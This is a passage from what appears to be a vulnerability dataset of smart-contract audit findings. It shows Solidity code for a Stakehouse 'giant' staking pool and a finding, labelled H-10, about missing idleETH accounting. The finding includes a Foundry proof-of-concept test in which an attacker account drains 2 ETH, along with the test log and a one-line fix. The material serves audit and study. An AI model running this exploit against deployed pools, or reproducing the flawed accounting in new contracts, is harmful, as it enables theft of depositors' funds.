due}(\"\");\n                require(success, \"Failed to transfer\");\n\n                emit ETHDistributed(_user, _recipient, due);\n            }\n        }\n    }\n\n    /// @dev Internal logic for tracking accumulated ETH per share\n    function _updateAccumulatedETHPerLP(uint256 _numOfShares) internal {\n        if (_numOfShares > 0) {\n            uint256 received = totalRewardsReceived();\n            uint256 unprocessed = received - totalETHSeen;\n\n            if (unprocessed > 0) {\n                emit ETHReceived(unprocessed);\n\n                // accumulated ETH per minted share is scaled to avoid precision loss. it is scaled down later\n                accumulatedETHPerLPShare += (unprocessed * PRECISION) / _numOfShares;\n\n                totalETHSeen = received;\n            }\n        }\n    }\n\n    /// @notice Total rewards received by this contract from the syndicate\n    function totalRewardsReceived() public virtual view returns (uint256) {\n        return address(this).balance + totalClaimed;\n    }\n\n    /// @notice Allow the contract to receive ETH\n    receive() external payable {}\n}\n\npragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { GiantLP } from \"./GiantLP.sol\";\nimport { StakingFundsVault } from \"./StakingFundsVault.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { GiantPoolBase } from \"./GiantPoolBase.sol\";\nimport { SyndicateRewardsProcessor } from \"./SyndicateRewardsProcessor.sol\";\nimport { LSDNFactory } from \"./LSDNFactory.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { ITransferHookProcessor } from \"../interfaces/ITransferHookProcessor.sol\";\n\n/// @notice A giant pool that can provide liquidity to any liquid staking network's staking funds vault\ncontract GiantMevAndFeesPool is ITransferHookProcessor, GiantPoolBase, SyndicateRewardsProcessor {\n\n    constructor(LSDNFactory _factory) {\n        lpTokenETH = new GiantLP(address(this), address(this), \"GiantETHLP\", \"gMevETH\");\n        liquidStakingDerivativeFactory = _factory;\n    }\n\n    /// @notice Stake ETH against multiple BLS keys within multiple LSDNs and specify the amount of ETH being supplied for each key\n    /// @dev Uses contract balance for funding and get Staking Funds Vault LP in exchange for ETH\n    /// @param _stakingFundsVault List of mev and fees vaults being interacted with\n    /// @param _ETHTransactionAmounts ETH being attached to each savETH vault in the list\n    /// @param _blsPublicKeyOfKnots For every staking funds vault, the list of BLS keys of LSDN validators receiving funding\n    /// @param _amounts List of amounts of ETH being staked per BLS public key\n    function batchDepositETHForStaking(\n        address[] calldata _stakingFundsVault,\n        uint256[] calldata _ETHTransactionAmounts,\n        bytes[][] calldata _blsPublicKeyOfKnots,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _stakingFundsVault.length;\n        require(numOfVaults > 0, \"Zero vaults\");\n        require(numOfVaults == _blsPublicKeyOfKnots.length, \"Inconsistent lengths\");\n        require(numOfVaults == _amounts.length, \"Inconsistent lengths\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            // As ETH is being deployed to a staking funds vault, it is no longer idle\n            idleETH -= _ETHTransactionAmounts[i];\n\n            StakingFundsVault sfv = StakingFundsVault(payable(_stakingFundsVault[i]));\n            require(\n                liquidStakingDerivativeFactory.isLiquidStakingManager(address(sfv.liquidStakingNetworkManager())),\n                \"Invalid liquid staking manager\"\n            );\n\n            sfv.batchDepositETHForStaking{ value: _ETHTransactionAmounts[i] }(\n                _blsPublicKeyOfKnots[i],\n                _amounts[i]\n            );\n        }\n    }\n\n    /// @notice Allow a giant LP to claim a % of the revenue received by the MEV and Fees Pool\n    function claimRewards(\n        address _recipient,\n        address[] calldata _stakingFundsVaults,\n        bytes[][] calldata _blsPublicKeysForKnots\n    ) external {\n        uint256 numOfVaults = _stakingFundsVaults.length;\n        require(numOfVaults > 0, \"Empty array\");\n        require(numOfVaults == _blsPublicKeysForKnots.length, \"Inconsistent array lengths\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).claimRewards(\n                address(this),\n                _blsPublicKeysForKnots[i]\n            );\n        }\n\n        updateAccumulatedETHPerLP();\n\n        _distributeETHRewardsToUserForToken(\n            msg.sender,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(msg.sender),\n            _recipient\n        );\n    }\n\n    /// @notice Preview total ETH accumulated by an address\n    function previewAccumulatedETH(\n        address _user,\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _lpTokens\n    ) external view returns (uint256) {\n        require(_stakingFundsVaults.length == _lpTokens.length, \"Inconsistent array lengths\");\n\n        uint256 accumulated;\n        for (uint256 i; i < _stakingFundsVaults.length; ++i) {\n            accumulated = StakingFundsVault(payable(_stakingFundsVaults[i])).batchPreviewAccumulatedETH(\n                address(this),\n                _lpTokens[i]\n            );\n        }\n\n        return _previewAccumulatedETH(_user, address(lpTokenETH), lpTokenETH.balanceOf(_user), lpTokenETH.totalSupply(), accumulated);\n    }\n\n    /// @notice Any ETH supplied to a BLS key registered with a liquid staking network can be rotated to another key if it never gets staked\n    /// @param _stakingFundsVaults List of staking funds vaults this contract will contact\n    /// @param _oldLPTokens List of savETH vault LP tokens that the vault has\n    /// @param _oldLPTokens List of new savETH vault LP tokens that the vault wants to receive in exchange for moving ETH to a new KNOT\n    /// @param _amounts Amount of old being swapped for new per LP token\n    function batchRotateLPTokens(\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _oldLPTokens,\n        LPToken[][] calldata _newLPTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfRotations = _stakingFundsVaults.length;\n        require(numOfRotations > 0, \"Empty arrays\");\n        require(numOfRotations == _oldLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _newLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _amounts.length, \"Inconsistent arrays\");\n        require(lpTokenETH.balanceOf(msg.sender) >= 0.5 ether, \"No common interest\");\n        for (uint256 i; i < numOfRotations; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).batchRotateLPTokens(_oldLPTokens[i], _newLPTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Any ETH that has not been utilized by a Staking Funds vault can be brought back into the giant pool\n    /// @param _stakingFundsVaults List of staking funds vaults this contract will contact\n    /// @param _lpTokens List of LP tokens that the giant pool holds which represents ETH in a staking funds vault\n    /// @param _amounts Amounts of LP within the giant pool being burnt\n    function bringUnusedETHBackIntoGiantPool(\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _lpTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _stakingFundsVaults.length;\n        require(numOfVaults > 0, \"Empty arrays\");\n        require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n        require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).burnLPTokensForETH(_lpTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Distribute any new ETH received to LP holders\n    function updateAccumulatedETHPerLP() public {\n        _updateAccumulatedETHPerLP(lpTokenETH.totalSupply());\n    }\n\n    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n    function beforeTokenTransfer(address _from, address _to, uint256) external {\n        require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n        updateAccumulatedETHPerLP();\n\n        // Make sure that `_from` gets total accrued before transfer as post transferred anything owed will be wiped\n        if (_from != address(0)) {\n            _distributeETHRewardsToUserForToken(\n                _from,\n                address(lpTokenETH),\n                lpTokenETH.balanceOf(_from),\n                _from\n            );\n        }\n\n        // Make sure that `_to` gets total accrued before transfer as post transferred anything owed will be wiped\n        _distributeETHRewardsToUserForToken(\n            _to,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(_to),\n            _to\n        );\n    }\n\n    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n    function afterTokenTransfer(address, address _to, uint256) external {\n        require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n        _setClaimedToMax(_to);\n    }\n\n    /// @notice Total rewards received by this contract from the syndicate excluding idle ETH from LP depositors\n    function totalRewardsReceived() public view override returns (uint256) {\n        return address(this).balance + totalClaimed - idleETH;\n    }\n\n    /// @dev On withdrawing LP in exchange for burning giant LP, claim rewards\n    function _onWithdraw(LPToken[] calldata _lpTokens) internal override {\n        // Use the transfer hook of LPToken to trigger the claiming accrued ETH\n        for (uint256 i; i < _lpTokens.length; ++i) {\n            _lpTokens[i].transfer(address(this), _lpTokens[i].balanceOf(address(this)));\n        }\n\n        _distributeETHRewardsToUserForToken(\n            msg.sender,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(msg.sender),\n            msg.sender\n        );\n    }\n\n    /// @dev On depositing on ETH set claimed to max claim so the new depositor cannot claim ETH that they have not accrued\n    function _onDepositETH() internal override {\n        _setClaimedToMax(msg.sender);\n    }\n\n    /// @dev Internal re-usable method for setting claimed to max for msg.sender\n    function _setClaimedToMax(address _user) internal {\n        // New ETH stakers are not entitled to ETH earned by\n        claimed[_user][address(lpTokenETH)] = (accumulatedETHPerLPShare * lpTokenETH.balanceOf(_user)) / PRECISION;\n    }\n}\n\n",
        "CodeNames": [
            "SyndicateRewardsProcessor.sol",
            "GiantMevAndFeesPool.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-10",
                "Location": [
                    "batchDepositETHForStaking",
                    "bringUnusedETHBackIntoGiantPool",
                    "accumulatedETHPerLPShare",
                    "_updateAccumulatedETHPerLP"
                ],
                "Type": "  GiantMevAndFeesPool.bringUnusedETHBackIntoGiantPool  function loses the addition of the idleETH which allows attackers to steal most of eth from the Giant Pool",
                "Description": "*Submitted by ronnyx2017(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/173), also found by Lambda(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/141)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126-L138<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L176-L178<br\n\nThe contract GiantMevAndFeesPool override the function totalRewardsReceived:\n\n    return address(this).balance + totalClaimed idleETH;\n\nThe function totalRewardsReceived is used as the current rewards balance to caculate the unprocessed rewards in the function SyndicateRewardsProcessor._updateAccumulatedETHPerLP\n\n    uint256 received = totalRewardsReceived();\n    uint256 unprocessed = received totalETHSeen;\n\nThe idleETH will be decreased in the function batchDepositETHForStaking for sending eth to the staking pool. But the idleETH wont be increased in the function bringUnusedETHBackIntoGiantPool which is used to burn lp tokens in the staking pool, and the staking pool will send the eth back to the giant pool. And then because of the diminution of the idleETH, the accumulatedETHPerLPShare is added out of thin air. So the attacker can steal more eth from the GiantMevAndFeesPool.\n\n\ntest:<br\ntest/foundry/TakeFromGiantPools.t.sol\n\n    pragma solidity ^0.8.13;\n\n    // SPDX-License-Identifier: MIT\n\n    import \"forge-std/console.sol\";\n    import {GiantPoolTests} from \"./GiantPools.t.sol\";\n    import { LPToken } from \"../../contracts/liquid-staking/LPToken.sol\";\n\n    contract TakeFromGiantPools is GiantPoolTests {\n        function testDWclaimRewards() public{\n            address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);\n            address feesAndMevUserOne = accountTwo; vm.deal(feesAndMevUserOne, 4 ether);\n            address feesAndMevUserTwo = accountThree; vm.deal(feesAndMevUserTwo, 4 ether);\n\n            // Register BLS key\n            registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);\n\n            // Deposit ETH into giant fees and mev\n            vm.startPrank(feesAndMevUserOne);\n            giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);\n            vm.stopPrank();\n            vm.startPrank(feesAndMevUserTwo);\n            giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);\n\n            bytes[][] memory blsKeysForVaults = new bytes[][(1);\n            blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);\n\n            uint256[][] memory stakeAmountsForVaults = new uint256[][(1);\n            stakeAmountsForVaults[0] = getUint256ArrayFromValues(4 ether);\n            giantFeesAndMevPool.batchDepositETHForStaking(\n                getAddressArrayFromValues(address(manager.stakingFundsVault())),\n                getUint256ArrayFromValues(4 ether),\n                blsKeysForVaults,\n                stakeAmountsForVaults\n            );\n            vm.warp(block.timestamp+31 minutes);\n            LPToken[] memory tokens = new LPToken[(1);\n            tokens[0] = manager.stakingFundsVault().lpTokenForKnot(blsPubKeyOne);\n\n            LPToken[][] memory allTokens = new LPToken[][(1);\n            allTokens[0] = tokens;\n            giantFeesAndMevPool.bringUnusedETHBackIntoGiantPool(\n                getAddressArrayFromValues(address(manager.stakingFundsVault())),\n                allTokens,\n                stakeAmountsForVaults\n            );\n            // inject a NOOP to skip some functions\n            address[] memory stakingFundsVaults = new address[(1);\n            bytes memory code = new bytes(1);\n            code[0] = 0x00;\n            vm.etch(address(0x123), code);\n            stakingFundsVaults[0] = address(0x123);\n            giantFeesAndMevPool.claimRewards(feesAndMevUserTwo, stakingFundsVaults, blsKeysForVaults);\n            vm.stopPrank();\n            console.log(\"user one:\", getBalance(feesAndMevUserOne));\n            console.log(\"user two(attacker):\", getBalance(feesAndMevUserTwo));\n            console.log(\"giantFeesAndMevPool:\", getBalance(address(giantFeesAndMevPool)));\n        }\n\n        function getBalance(address addr) internal returns (uint){\n            // giant LP : eth at ratio of 1:1\n            return addr.balance + giantFeesAndMevPool.lpTokenETH().balanceOf(addr);\n        }\n\n    }\n\nrun test:\n\n    forge test --match-test testDWclaimRewards -vvv\n\ntest log:\n\n    Logs:\n      user one: 4000000000000000000\n      user two(attacker): 6000000000000000000\n      giantFeesAndMevPool: 6000000000000000000\n\nThe attacker stole 2 eth from the pool.\n\n\nfoundry\n\n",
                "Repair": "\nAdd\n\n    idleETH += _amounts[i];\n\nbefore burnLPTokensForETH in the GiantMevAndFeesPool.bringUnusedETHBackIntoGiantPool function.\n\nvince0656 (Stakehouse) confirmed(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/173)\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { GiantLP } from \"./GiantLP.sol\";\nimport { StakingFundsVault } from \"./StakingFundsVault.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { GiantPoolBase } from \"./GiantPoolBase.sol\";\nimport { SyndicateRewardsProcessor } from \"./SyndicateRewardsProcessor.sol\";\nimport { LSDNFactory } from \"./LSDNFactory.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { ITransferHookProcessor } from \"../interfaces/ITransferHookProcessor.sol\";\n\n/// @notice A giant pool that can provide liquidity to any liquid staking network's staking funds vault\ncontract GiantMevAndFeesPool is ITransferHookProcessor, GiantPoolBase, SyndicateRewardsProcessor {\n\n    constructor(LSDNFactory _factory) {\n        lpTokenETH = new GiantLP(address(this), address(this), \"GiantETHLP\", \"gMevETH\");\n        liquidStakingDerivativeFactory = _factory;\n    }\n\n    /// @notice Stake ETH against multiple BLS keys within multiple LSDNs and specify the amount of ETH being supplied for each key\n    /// @dev Uses contract balance for funding and get Staking Funds Vault LP in exchange for ETH\n    /// @param _stakingFundsVault List of mev and fees vaults being interacted with\n    /// @param _ETHTransactionAmounts ETH being attached to each savETH vault in the list\n    /// @param _blsPublicKeyOfKnots For every staking funds vault, the list of BLS keys of LSDN validators receiving funding\n    /// @param _amounts List of amounts of ETH being staked per BLS public key\n    function batchDepositETHForStaking(\n        address[] calldata _stakingFundsVault,\n        uint256[] calldata _ETHTransactionAmounts,\n        bytes[][] calldata _blsPublicKeyOfKnots,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _stakingFundsVault.length;\n        require(numOfVaults > 0, \"Zero vaults\");\n        require(numOfVaults == _blsPublicKeyOfKnots.length, \"Inconsistent lengths\");\n        require(numOfVaults == _amounts.length, \"Inconsistent lengths\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            // As ETH is being deployed to a staking funds vault, it is no longer idle\n            idleETH -= _ETHTransactionAmounts[i];\n\n            StakingFundsVault sfv = StakingFundsVault(payable(_stakingFundsVault[i]));\n            require(\n                liquidStakingDerivativeFactory.isLiquidStakingManager(address(sfv.liquidStakingNetworkManager())),\n                \"Invalid liquid staking manager\"\n            );\n\n            sfv.batchDepositETHForStaking{ value: _ETHTransactionAmounts[i] }(\n                _blsPublicKeyOfKnots[i],\n                _amounts[i]\n            );\n        }\n    }\n\n    /// @notice Allow a giant LP to claim a % of the revenue received by the MEV and Fees Pool\n    function claimRewards(\n        address _recipient,\n        address[] calldata _stakingFundsVaults,\n        bytes[][] calldata _blsPublicKeysForKnots\n    ) external {\n        uint256 numOfVaults = _stakingFundsVaults.length;\n        require(numOfVaults > 0, \"Empty array\");\n        require(numOfVaults == _blsPublicKeysForKnots.length, \"Inconsistent array lengths\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).claimRewards(\n                address(this),\n                _blsPublicKeysForKnots[i]\n            );\n        }\n\n        updateAccumulatedETHPerLP();\n\n        _distributeETHRewardsToUserForToken(\n            msg.sender,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(msg.sender),\n            _recipient\n        );\n    }\n\n    /// @notice Preview total ETH accumulated by an address\n    function previewAccumulatedETH(\n        address _user,\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _lpTokens\n    ) external view returns (uint256) {\n        require(_stakingFundsVaults.length == _lpTokens.length, \"Inconsistent array lengths\");\n\n        uint256 accumulated;\n        for (uint256 i; i < _stakingFundsVaults.length; ++i) {\n            accumulated = StakingFundsVault(payable(_stakingFundsVaults[i])).batchPreviewAccumulatedETH(\n                address(this),\n                _lpTokens[i]\n            );\n        }\n\n        return _previewAccumulatedETH(_user, address(lpTokenETH), lpTokenETH.balanceOf(_user), lpTokenETH.totalSupply(), accumulated);\n    }\n\n    /// @notice Any ETH supplied to a BLS key registered with a liquid staking network can be rotated to another key if it never gets staked\n    /// @param _stakingFundsVaults List of staking funds vaults this contract will contact\n    /// @param _oldLPTokens List of savETH vault LP tokens that the vault has\n    /// @param _oldLPTokens List of new savETH vault LP tokens that the vault wants to receive in exchange for moving ETH to a new KNOT\n    /// @param _amounts Amount of old being swapped for new per LP token\n    function batchRotateLPTokens(\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _oldLPTokens,\n        LPToken[][] calldata _newLPTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfRotations = _stakingFundsVaults.length;\n        require(numOfRotations > 0, \"Empty arrays\");\n        require(numOfRotations == _oldLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _newLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _amounts.length, \"Inconsistent arrays\");\n        require(lpTokenETH.balanceOf(msg.sender) >= 0.5 ether, \"No common interest\");\n        for (uint256 i; i < numOfRotations; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).batchRotateLPTokens(_oldLPTokens[i], _newLPTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Any ETH that has not been utilized by a Staking Funds vault can be brought back into the giant pool\n    /// @param _stakingFundsVaults List of staking funds vaults this contract will contact\n    /// @param _lpTokens List of LP tokens that the giant pool holds which represents ETH in a staking funds vault\n    /// @param _amounts Amounts of LP within the giant pool being burnt\n    function bringUnusedETHBackIntoGiantPool(\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _lpTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _stakingFundsVaults.length;\n        require(numOfVaults > 0, \"Empty arrays\");\n        require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n        require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).burnLPTokensForETH(_lpTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Distribute any new ETH received to LP holders\n    function updateAccumulatedETHPerLP() public {\n        _updateAccumulatedETHPerLP(lpTokenETH.totalSupply());\n    }\n\n    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n    function beforeTokenTransfer(address _from, address _to, uint256) external {\n        require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n        updateAccumulatedETHPerLP();\n\n        // Make sure that `_from` gets total accrued before transfer as post transferred anything owed will be wiped\n        if (_from != address(0)) {\n            _distributeETHRewardsToUserForToken(\n                _from,\n                address(lpTokenETH),\n                lpTokenETH.balanceOf(_from),\n                _from\n            );\n        }\n\n        // Make sure that `_to` gets total accrued before transfer as post transferred anything owed will be wiped\n        _distributeETHRewardsToUserForToken(\n            _to,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(_to),\n            _to\n        );\n    }\n\n    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n    function afterTokenTransfer(address, address _to, uint256) external {\n        require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n        _setClaimedToMax(_to);\n    }\n\n    /// @notice Total rewards received by this contract from the syndicate excluding idle ETH from LP depositors\n    function totalRewardsReceived() public view override returns (uint256) {\n        return address(this).balance + totalClaimed - idleETH;\n    }\n\n    /// @dev On withdrawing LP in exchange for burning giant LP, claim rewards\n    function _onWithdraw(LPToken[] calldata _lpTokens) internal override {\n        // Use the transfer hook of LPToken to trigger the claiming accrued ETH\n        for (uint256 i; i < _lpTokens.length; ++i) {\n            _lpTokens[i].transfer(address(this), _lpTokens[i].balanceOf(address(this)));\n        }\n\n        _distributeETHRewardsToUserForToken(\n            msg.sender,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(msg.sender),\n            msg.sender\n        );\n    }\n\n    /// @dev On depositing on ETH set claimed to max claim so the new depositor cannot claim ETH that they have not accrued\n    function _onDepositETH() internal override {\n        _setClaimedToMax(msg.sender);\n    }\n\n    /// @dev Internal re-usable method for setting claimed to max for msg.sender\n    function _setClaimedToMax(address _user) internal {\n        // New ETH stakers are not entitled to ETH earned by\n        claimed[_user][address(lpTokenETH)] = (accumulatedETHPerLPShare * lpTokenETH.balanceOf(_user)) / PRECISION;\n    }\n}\n\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\nimport { Initializable } from \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\nimport { Ownable } from \"@openzeppelin/contracts/access/Ownable.sol\";\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { ReentrancyGuard } from \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport { Address } from \"@openzeppelin/contracts/utils/Address.sol\";\n\nimport { StakehouseAPI } from \"@blockswaplab/stakehouse-solidity-api/contracts/StakehouseAPI.sol\";\nimport { ITransactionRouter } from \"@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/ITransactionRouter.sol\";\nimport { IDataStructures } from \"@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IDataStructures.sol\";\nimport { IStakeHouseRegistry } from \"@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IStakeHouseRegistry.sol\";\n\nimport { SavETHVaultDeployer } from \"./SavETHVaultDeployer.sol\";\nimport { StakingFundsVaultDeployer } from \"./StakingFundsVaultDeployer.sol\";\nimport { StakingFundsVault } from \"./StakingFundsVault.sol\";\nimport { SavETHVault } from \"./SavETHVault.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { LPTokenFactory } from \"./LPTokenFactory.sol\";\nimport { SyndicateFactory } from \"../syndicate/SyndicateFactory.sol\";\nimport { Syndicate } from \"../syndicate/Syndicate.sol\";\nimport { OptionalHouseGatekeeper } from \"./OptionalHouseGatekeeper.sol\";\nimport { OptionalGatekeeperFactory } from \"./OptionalGatekeeperFactory.sol\";\nimport { OwnableSmartWalletFactory } from \"../smart-wallet/OwnableSmartWalletFactory.sol\";\nimport { IOwnableSmartWalletFactory } from \"../smart-wallet/interfaces/IOwnableSmartWalletFactory.sol\";\nimport { IOwnableSmartWallet } from \"../smart-wallet/interfaces/IOwnableSmartWallet.sol\";\nimport { ISyndicateFactory } from \"../interfaces/ISyndicateFactory.sol\";\nimport { ILiquidStakingManager } from \"../interfaces/ILiquidStakingManager.sol\";\nimport { IBrandNFT } from \"../interfaces/IBrandNFT.sol\";\n\ncontract LiquidStakingManager is ILiquidStakingManager, Initializable, ReentrancyGuard, StakehouseAPI {\n\n    /// @notice signalize change in status of whitelisting\n    event WhitelistingStatusChanged(address indexed dao, bool updatedStatus);\n\n    /// @notice signalize updated whitelist status of node runner\n    event NodeRunnerWhitelistingStatusChanged(address indexed nodeRunner, bool updatedStatus);\n\n    /// @notice signalize creation of a new smart wallet\n    event SmartWalletCreated(address indexed smartWallet, address indexed nodeRunner);\n\n    /// @notice signalize appointing of a representative for a smart wallet by the node runner\n    event RepresentativeAppointed(address indexed smartWallet, address indexed eoaRepresentative);\n\n    /// @notice signalize wallet being credited with ETH\n    event WalletCredited(address indexed smartWallet, uint256 amount);\n\n    /// @notice signalize staking of a KNOT\n    event KnotStaked(bytes _blsPublicKeyOfKnot, address indexed trigerringAddress);\n\n    /// @notice signalize creation of stakehouse\n    event StakehouseCreated(string stakehouseTicker, address indexed stakehouse);\n\n    /// @notice signalize joining a stakehouse\n    event StakehouseJoined(bytes blsPubKey);\n\n    ///@notice signalize removal of representative from smart wallet\n    event RepresentativeRemoved(address indexed smartWallet, address indexed eoaRepresentative);\n\n    /// @notice signalize dormant representative\n    event DormantRepresentative(address indexed associatedSmartWallet, address representative);\n\n    /// @notice signalize refund of withdrawal of 4 ETH for a BLS public key by the node runner\n    event ETHWithdrawnFromSmartWallet(address indexed associatedSmartWallet, bytes blsPublicKeyOfKnot, address nodeRunner);\n\n    /// @notice signalize that the network has updated its ticker before its house was created\n    event NetworkTickerUpdated(string newTicker);\n\n    /// @notice signalize that the node runner has claimed rewards from the syndicate\n    event NodeRunnerRewardsClaimed(address indexed nodeRunner, address indexed recipient);\n\n    /// @notice signalize that the node runner of the smart wallet has been rotated\n    event NodeRunnerOfSmartWalletRotated(address indexed wallet, address indexed oldRunner, address indexed newRunner);\n\n    /// @notice signalize banning of a node runner\n    event NodeRunnerBanned(address indexed nodeRunner);\n\n    /// @notice signalize that the dao management address has been moved\n    event UpdateDAOAddress(address indexed oldAddress, address indexed newAddress);\n\n    /// @notice signalize that the dao commission from network revenue has been updated\n    event DAOCommissionUpdated(uint256 old, uint256 newCommission);\n\n    /// @notice signalize that a new BLS public key for an LSD validator has been registered\n    event NewLSDValidatorRegistered(address indexed nodeRunner, bytes blsPublicKey);\n\n    /// @notice Address of brand NFT\n    address public brand;\n\n    /// @notice stakehouse created by the LSD network\n    address public override stakehouse;\n\n    /// @notice Fees and MEV EIP1559 distribution contract for the LSD network\n    address public syndicate;\n\n    /// @notice address of the DAO deploying the contract\n    address public dao;\n\n    /// @notice address of optional gatekeeper for admiting new knots to the house created by the network\n    OptionalHouseGatekeeper public gatekeeper;\n\n    /// @notice instance of the syndicate factory that deploys the syndicates\n    ISyndicateFactory public syndicateFactory;\n\n    /// @notice instance of the smart wallet factory that deploys the smart wallets for node runners\n    IOwnableSmartWalletFactory public smartWalletFactory;\n\n    /// @notice string name for the stakehouse 3-5 characters long\n    string public stakehouseTicker;\n\n    /// @notice DAO staking funds vault\n    StakingFundsVault public stakingFundsVault;\n\n    /// @notice SavETH vault\n    SavETHVault public savETHVault;\n\n    /// @notice whitelisting indicator. true for enables and false for disabled\n    bool public enableWhitelisting;\n\n    /// @notice mapping to store if a node runner is whitelisted\n    mapping(address => bool) public isNodeRunnerWhitelisted;\n\n    /// @notice EOA representative appointed for a smart wallet\n    mapping(address => address) public smartWalletRepresentative;\n\n    /// @notice Smart wallet used to deploy KNOT\n    mapping(bytes => address) public smartWalletOfKnot;\n\n    /// @notice Smart wallet issued to the Node runner. Node runner address <> Smart wallet address\n    mapping(address => address) public smartWalletOfNodeRunner;\n\n    /// @notice Node runner issued to Smart wallet. Smart wallet address <> Node runner address\n    mapping(address => address) public nodeRunnerOfSmartWallet;\n\n    /// @notice Track number of staked KNOTs of a smart wallet\n    mapping(address => uint256) public stakedKnotsOfSmartWallet;\n\n    /// @notice smart wallet <> dormant rep.\n    mapping(address => address) public smartWalletDormantRepresentative;\n\n    /// @notice Track BLS public keys that have been banned. \n    /// If banned, the BLS public key will be mapped to its respective smart wallet\n    mapping(bytes => address) public bannedBLSPublicKeys;\n\n    /// @notice Track node runner addresses that are banned.\n    /// Malicious node runners can be banned by the DAO\n    mapping(address => bool) public bannedNodeRunners;\n\n    /// @notice count of KNOTs interacted with LSD network\n    uint256 public numberOfKnots;\n\n    /// @notice Commission percentage to 5 decimal places\n    uint256 public daoCommissionPercentage;\n\n    /// @notice 100% to 5 decimal places\n    uint256 public MODULO = 100_00000;\n\n    modifier onlyDAO() {\n        require(msg.sender == dao, \"Must be DAO\");\n        _;\n    }\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() initializer {}\n\n    /// @inheritdoc ILiquidStakingManager\n    function init(\n        address _dao,\n        address _syndicateFactory,\n        address _smartWalletFactory,\n        address _lpTokenFactory,\n        address _brand,\n        address _savETHVaultDeployer,\n        address _stakingFundsVaultDeployer,\n        address _optionalGatekeeperDeployer,\n        uint256 _optionalCommission,\n        bool _deployOptionalGatekeeper,\n        string calldata _stakehouseTicker\n    ) external virtual override initializer {\n        _init(\n            _dao,\n            _syndicateFactory,\n            _smartWalletFactory,\n            _lpTokenFactory,\n            _brand,\n            _savETHVaultDeployer,\n            _stakingFundsVaultDeployer,\n            _optionalGatekeeperDeployer,\n            _optionalCommission,\n            _deployOptionalGatekeeper,\n            _stakehouseTicker\n        );\n    }\n\n    /// @notice Enable operations proxied through DAO contract to 